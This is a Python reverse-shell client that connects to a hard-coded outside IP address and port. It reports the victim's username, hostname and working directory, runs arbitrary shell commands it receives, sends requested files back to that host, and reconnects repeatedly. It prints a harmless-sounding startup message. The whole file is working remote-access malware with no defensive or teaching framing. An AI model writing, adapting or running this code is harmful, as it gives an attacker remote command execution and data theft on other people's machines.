import socket
import subprocess
import os
import getpass, platform
import time


HOST = "89.58.7.251"#"192.168.56.1"
PORT = 8243
HEADER = 64


def fill_in(data, length):
    if length > len(data): 
        return data + b" " * (length - len(data))
    else:
        return data


def send_data(sock, data):
    send_length = str(len(data)).encode("utf-8")
    send_length += b' ' * (HEADER - len(send_length))
    sock.send(send_length)
    sock.send(data)


def cd_command(path):
    try:
        os.chdir(path)
        return "Changed dir", None
    except Exception as e:
        return None, str(e)


def download_command(sock, path):
    try:
        with open(path, "rb") as f:
            # sends if file exists
            sock.send(b"1")

            # reading file
            data = fill_in(f.read(1024), 1024)
            while True:
                sock.send(data)
                data = f.read(1024)
                if not data:
                    break
                data = fill_in(data, 1024)

            sock.send(fill_in(b"FINISHED", 1024))
            return "finished", None

    except Exception as e:
        # sends if file doesnt exist or is not accessable
        return None, str(e)


def other_command(command):
    p = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    out = p.stdout.read().decode("cp850")
    err = p.stderr.read().decode("cp850")
    if not out and not err:
        out = "No Output"
    return out, err


def main():
    running = True
    while running:
        try:
            # open socket
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((HOST, PORT))

                while running:
                    OUT = ERR = ""

                    prompt = f"{getpass.getuser()}@{platform.node()}  {os.getcwd()}"
                    send_data(s, prompt.encode())

                    msg = s.recv(4096).decode()
                    command = msg.split(" ", 1)[0]
                    
                    if command == "cd" and len(msg) > 3:
                        path = msg.split(" ", 1)[1]
                        OUT, ERR = cd_command(path)
                    elif command == "download":
                        path = msg.split(" ", 1)[1]
                        OUT, ERR = download_command(s, path)
                    elif command == "destroy":
                        OUT, ERR = "destroy", None
                        running = False
                    else:
                        OUT, ERR = other_command(msg)

                    # output
                    if OUT:
                        send_data(s, OUT.encode())
                    else:
                        send_data(s, ERR.encode())

                    time.sleep(0.5)

        except Exception as e:
            print(e)


if __name__ == "__main__":
    time.sleep(5)
    print("Starting this beautiful little program...")
    main()